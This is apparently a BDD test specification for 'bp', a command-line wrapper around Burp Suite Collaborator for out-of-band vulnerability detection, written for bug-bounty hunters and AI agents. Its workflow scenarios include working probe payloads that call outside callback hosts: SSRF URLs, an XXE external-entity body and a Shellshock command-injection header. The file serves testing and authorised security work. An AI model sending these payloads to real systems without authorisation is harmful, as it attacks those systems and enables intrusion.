Feature: Collaborator — OAST payload generation and out-of-band interaction polling
  As a bug-bounty hunter or AI agent using `bp`,
  I want to generate Burp Collaborator payloads and poll for DNS/HTTP/SMTP interactions
  so that I can detect and prove blind SSRF, RCE, XXE, and other OOB vulnerabilities.

  # Endpoints covered:
  #   POST /collaborator/generate       → bp collab new
  #   POST /collaborator/generate/batch → bp collab new --count N
  #   GET  /collaborator/poll           → bp collab poll
  #   GET  /collaborator/poll/{id}      → bp collab poll <id>
  #
  # Spec flags (load-bearing caveats):
  #   - interactionId == id (local key, not a Burp UUID)
  #   - timestamp = Instant.now() at poll time, NOT at interaction capture time
  #   - /generate/batch and /poll/{id} are absent from /docs (OpenAPI 0.2.0 incomplete)
  #   - Poll errors silently swallowed → found=false, HTTP 200
  #   - "id unknown" is indistinguishable from "no interaction yet"
  #   - State is in-memory only — lost on Burp/extension restart
  # Output rendering (--format/--fields/-w/--quiet) is proved once in 00-output.feature.
  # Cross-cutting errors (CONNECTION_REFUSED, generic --id invalid, ApiResponse envelope,
  # PRO_REQUIRED) are proved once in 00-common.feature.

  Background:
    Given Burp Suite Professional is running and the extension is loaded at http://127.0.0.1:8089
    And the Collaborator API is available (bp health confirms status ok)

  # ═══════════════════════════════════════════════════════════════════════════
  # §1  GENERATE — single payload schema contract
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Generate a single Collaborator payload — JSON schema contract (agent mode)
    When I run:
      """
      bp collab new --format json
      """
    Then the exit code is 0
    And stdout is a single compact JSON line (no newlines inside the object) matching:
      """
      {"success":true,"data":{"id":"<8-char-prefix>","payload":"<id>.oastify.com","interactionId":"<id>"},"error":null}
      """
    And data.id, data.payload, and data.interactionId are all present (stable schema)
    And data.payload ends with ".oastify.com" or a configured Collaborator-server domain
    And data.interactionId equals data.id (spec: interactionId is a local key)

  # ═══════════════════════════════════════════════════════════════════════════
  # §2  GENERATE/BATCH — multiple payloads, schema contract and count invariant
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario Outline: Generate a batch of payloads — count invariant and distinct-id guarantee
    When I run:
      """
      bp collab new --count <count> --format json
      """
    Then the exit code is 0
    And stdout is a single compact JSON line matching:
      """
      {"success":true,"data":{"payloads":[...],"count":<count>},"error":null}
      """
    And data.payloads has exactly <count> elements
    And all payload id values are distinct strings

    Examples:
      | count |
      | 1     |
      | 5     |
      | 10    |
      | 20    |

  @error @pro
  Scenario Outline: Generate batch with invalid count — endpoint-specific INVALID_REQUEST
    When I run:
      """
      bp collab new --count <bad_count> --format json
      """
    Then the exit code is non-zero
    And stdout contains:
      """
      {"success":false,"data":null,"error":{"code":"INVALID_REQUEST","message":"count must be >= 1"}}
      """

    Examples:
      | bad_count |
      | 0         |
      | -1        |
      | -100      |

  @error @pro
  Scenario: Generate batch with non-integer count — deserialization error (type-level contract)
    When I run:
      """
      bp collab new --count abc --format json
      """
    Then the exit code is non-zero
    And stdout contains error code INVALID_REQUEST
    And the HTTP status from Burp would be 400 (SerializationException mapped to INVALID_REQUEST)

  # ═══════════════════════════════════════════════════════════════════════════
  # §3  POLL — sweep all interactions for this session
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Poll all Collaborator interactions when none have occurred yet — empty result contract
    When I run:
      """
      bp collab poll --format json
      """
    Then the exit code is 0
    And stdout is:
      """
      {"success":true,"data":{"interactions":[],"count":0},"error":null}
      """

  @happy @pro
  Scenario Outline: Poll all interactions — interaction type enum contract (DNS/HTTP/SMTP)
    Given a Collaborator payload "<payload_id>" has triggered a "<interaction_type>" callback
    When I run:
      """
      bp collab poll --format json
      """
    Then the exit code is 0
    And stdout is a compact JSON line containing at least one interaction
    And the matching interaction has type "<interaction_type>"
    And each interaction object has fields: id, type, interactionId, timestamp
    And interactionId equals id for every entry (spec: interactionId == id, local key)

    Examples:
      | payload_id | interaction_type |
      | a1b2c3d4   | DNS              |
      | b2c3d4e5   | HTTP             |
      | c3d4e5f6   | SMTP             |

  @happy @pro
  Scenario: Poll returns all accumulated interactions without truncation
    Given 50 distinct Collaborator payloads have each received a DNS interaction
    When I run:
      """
      bp collab poll --format json
      """
    Then the exit code is 0
    And data.interactions contains all 50 interactions
    And data.count equals 50

  # ═══════════════════════════════════════════════════════════════════════════
  # §4  POLL/<id> — scoped poll for a specific payload id
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Poll a specific payload id that has received a DNS interaction — found=true contract
    Given a Collaborator payload with id "a1b2c3d4" was generated
    And a DNS lookup for "a1b2c3d4.oastify.com" has been observed
    When I run:
      """
      bp collab poll a1b2c3d4 --format json
      """
    Then the exit code is 0
    And stdout is a compact JSON line matching:
      """
      {"success":true,"data":{"id":"a1b2c3d4","found":true,"interactions":[{"id":"a1b2c3d4","type":"DNS","interactionId":"a1b2c3d4","timestamp":"..."}]},"error":null}
      """
    And data.found is true
    And data.interactions is non-empty

  @happy @pro
  Scenario: Poll a specific payload id with no interaction yet — found=false contract
    Given a Collaborator payload with id "b2c3d4e5" was just generated
    And no out-of-band interaction has occurred for "b2c3d4e5" yet
    When I run:
      """
      bp collab poll b2c3d4e5 --format json
      """
    Then the exit code is 0
    And stdout is:
      """
      {"success":true,"data":{"id":"b2c3d4e5","found":false,"interactions":[]},"error":null}
      """
    And data.found is false
    And the exit code is 0 (HTTP 200 — spec: errors silently swallowed)

  @happy @pro
  Scenario: Poll a payload id that does not exist — silent found=false, no error (spec caveat)
    # Spec: "id unknown" is indistinguishable from "no interaction yet"
    When I run:
      """
      bp collab poll zzzzzzzz --format json
      """
    Then the exit code is 0
    And stdout is:
      """
      {"success":true,"data":{"id":"zzzzzzzz","found":false,"interactions":[]},"error":null}
      """
    And success is true and error is null (no error thrown for unknown id — HTTP 200 silent swallow)

  # ═══════════════════════════════════════════════════════════════════════════
  # §5  PRO GATE — one representative check across all four endpoints
  # ═══════════════════════════════════════════════════════════════════════════

  @error @community
  Scenario: Collaborator on Community edition — pre-flight edition check before REST call
    # All four endpoints return 503 SERVICE_UNAVAILABLE on Community.
    # bp MUST detect the edition before attempting the REST call and warn on stderr.
    Given Burp Suite Community Edition is running (no Collaborator API available)
    When I run:
      """
      bp collab new --format json
      """
    Then the exit code is non-zero (exit code 4 — PRO_REQUIRED)
    And stderr contains a human-readable warning before the REST call is attempted:
      """
      [bp] warning: collaborator requires Burp Suite Professional. Current edition: Community.
      """
    And stdout contains:
      """
      {"success":false,"data":null,"error":{"code":"PRO_REQUIRED","message":"..."}}
      """

  # ═══════════════════════════════════════════════════════════════════════════
  # §6  SPEC FLAGS — documented caveats that must be observable
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: interactionId equals id in every poll response object (spec-documented identity)
    # Spec: interactionId is a local key assigned by the extension, not a Burp server UUID
    Given a Collaborator payload with id "f6a7b8c9" has triggered a DNS interaction
    When I run:
      """
      bp collab poll f6a7b8c9 --format json
      """
    Then the exit code is 0
    And for every object in data.interactions: interactionId == id == "f6a7b8c9"

  @happy @pro
  Scenario: timestamp in poll response reflects poll time, NOT interaction capture time
    # Spec flag: timestamp = Instant.now() at poll — known limitation
    Given a DNS interaction for payload "a7b8c9d0" occurred 10 minutes ago
    When I run:
      """
      bp collab poll a7b8c9d0 --format json
      """
    Then the exit code is 0
    And data.interactions[0].timestamp is close to the current wall-clock time (within seconds)
    And the timestamp does NOT reflect the time the DNS lookup actually occurred

  @happy @pro
  Scenario: In-memory state reset — payloads generated before extension reload are not pollable after
    # Spec: state is in-memory only — lost on Burp/extension restart
    Given a Collaborator payload "b8c9d0e1" was generated before the Burp extension was reloaded
    When the Burp extension is reloaded
    And I run:
      """
      bp collab poll b8c9d0e1 --format json
      """
    Then data.found is false
    And bp handles this gracefully (exit 0, no exception, silent swallow per spec)

  @happy @pro
  Scenario: /generate/batch and /poll/{id} are absent from OpenAPI /docs but still functional
    # bp MUST NOT rely on GET /docs for endpoint discovery — OpenAPI 0.2.0 is incomplete
    When I run:
      """
      bp collab new --count 2 --format json
      """
    Then the exit code is 0
    And the batch endpoint responds correctly despite being absent from GET /docs

  # ═══════════════════════════════════════════════════════════════════════════
  # §7  BLIND SSRF / XXE / RCE WORKFLOWS — generate → inject → poll
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro @workflow
  Scenario: Blind SSRF detection — generate payload, inject via repeater (JSON body), poll for DNS
    # Step 1: Generate a Collaborator payload
    Given I run:
      """
      bp collab new --format json
      """
    And I extract data.id into shell variable OAST_ID (e.g. "a1b2c3d4")
    And I extract data.payload into OAST_HOST (e.g. "a1b2c3d4.oastify.com")

    # Step 2: Inject into the target via repeater using proxy history request id=42
    When I run:
      """
      bp send 42 --body "{\"url\":\"http://a1b2c3d4.oastify.com/ssrf-probe\"}" --format json
      """
    Then the exit code is 0
    And data.response.statusCode is present

    # Step 3: Poll for the DNS callback
    When I run:
      """
      bp collab poll a1b2c3d4 --format json
      """
    Then data.found is true (SSRF confirmed via DNS callback)
    Or data.found is false (interaction not yet received — retry needed)

  @happy @pro @workflow
  Scenario: Blind SSRF via fuzz — inject Collaborator payload across multiple body positions
    Given a Collaborator payload "e5f6a7b8.oastify.com" has been generated (id=e5f6a7b8)
    And a base HTTP request with id=7 is in the proxy history
    When I run:
      """
      bp fuzz 7 \
        --pos body:url \
        --type sniper \
        --payloads "http://e5f6a7b8.oastify.com/path1" "http://e5f6a7b8.oastify.com/path2" \
        --format json
      """
    Then the exit code is 0
    And fuzz results are returned for each payload
    When I run:
      """
      bp collab poll e5f6a7b8 --format json
      """
    Then if data.found is true, SSRF is confirmed at the injected position

  @happy @pro @workflow
  Scenario: Blind XXE — inject Collaborator payload via XML body
    # Distinct injection vector: XML external entity exfiltration
    Given a Collaborator payload id "b9c0d1e2" maps to "b9c0d1e2.oastify.com"
    And proxy history entry id=55 is a POST request to an XML-consuming endpoint
    When I run:
      """
      bp send 55 \
        --set-header "Content-Type: application/xml" \
        --body '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://b9c0d1e2.oastify.com/xxe">]><root>&xxe;</root>' \
        --format json
      """
    Then the exit code is 0
    And the HTTP response is captured in data.response
    When I run:
      """
      bp collab poll b9c0d1e2 --format json
      """
    Then if data.found is true with type=HTTP, XXE OOB exfiltration is confirmed

  @happy @pro @workflow
  Scenario: Blind RCE — inject Collaborator payload via header-based OS command injection (Shellshock)
    # Distinct vector: User-Agent header with command injection payload
    Given a fresh Collaborator payload id "c0d1e2f3" maps to "c0d1e2f3.oastify.com"
    And proxy history entry id=99 is a request with a User-Agent header
    When I run:
      """
      bp send 99 \
        --set-header "User-Agent: () { :; }; /usr/bin/nslookup c0d1e2f3.oastify.com" \
        --format json
      """
    Then the exit code is 0
    When I run:
      """
      bp collab poll c0d1e2f3 --format json
      """
    Then if data.found is true with type=DNS, a Shellshock or command injection vector is confirmed

  @happy @pro @workflow
  Scenario: Multi-endpoint SSRF sweep — batch generate, inject per endpoint, poll all to correlate
    # Batch generate → assign each payload to a distinct endpoint → poll all → correlate by id
    When I run:
      """
      bp collab new --count 5 --format json
      """
    Then the exit code is 0
    And 5 distinct id+payload pairs are returned (data.payloads array)
    When each payload is injected into a different endpoint parameter via bp send or bp fuzz
    And after a wait period I run:
      """
      bp collab poll --format json
      """
    Then any entry in data.interactions reveals which endpoint triggered the SSRF callback
    And the interaction's id field identifies which payload (and therefore which endpoint) fired

  @happy @pro @workflow
  Scenario: Poll loop — retry until interaction arrives or timeout (shell scripting contract)
    # Documents the retry pattern bp supports without a built-in --wait flag
    Given a Collaborator payload id "d1e2f3a4" was just injected
    When I run a polling loop:
      """
      for i in $(seq 1 10); do
        RESULT=$(bp collab poll d1e2f3a4 --format json)
        echo "$RESULT" | grep '"found":true' && break
        sleep 5
      done
      """
    Then if an interaction arrives within 50 seconds, the loop exits with found=true
    And the final poll output is a compact JSON line confirming the interaction type

  @happy @pro @workflow
  Scenario: Batch repeater probe — two payloads to two endpoints, correlate via poll all
    # Proves id-based correlation when using send --batch
    Given Collaborator payloads:
      | id       | payload              |
      | aa11bb22 | aa11bb22.oastify.com |
      | cc33dd44 | cc33dd44.oastify.com |
    When I run:
      """
      bp send --batch @requests.json --format json
      """
    And requests.json injects aa11bb22.oastify.com into endpoint1 and cc33dd44.oastify.com into endpoint2
    Then the exit code is 0
    And 2 responses are returned (batch is sequential per spec)
    When I run:
      """
      bp collab poll --format json
      """
    Then an interaction with id "aa11bb22" maps to endpoint1 triggering SSRF
    And an interaction with id "cc33dd44" maps to endpoint2 triggering SSRF

  # ═══════════════════════════════════════════════════════════════════════════
  # §8  AGENT MODE — endpoint-specific JSON schema contract for AI callers
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro @agent
  Scenario: Agent mode — generate JSON schema is stable and parseable without TTY
    # Output rendering is proved in 00-output.feature. This proves the schema shape only.
    Given the agent is running in a non-TTY piped context
    When the agent runs:
      """
      bp collab new --format json --no-ledger
      """
    Then stdout is exactly one compact JSON line (no newlines inside the JSON object)
    And the schema is stable: success (Boolean), data.id (String), data.payload (String),
      data.interactionId (String), error (null)
    And bp defaults to JSON mode when output is piped (no --format flag required)

  @happy @pro @agent
  Scenario: Agent mode — poll JSON schema is stable and supports found=true/false branching
    When the agent runs:
      """
      bp collab poll a1b2c3d4 --format json --no-ledger
      """
    Then stdout is a single compact JSON line
    And the agent reads data.found (Boolean) to decide whether to escalate the finding
    And data.interactions is always a JSON array (never null), even when found=false
    And data.interactions[0].type is one of: DNS, HTTP, SMTP (when found=true)
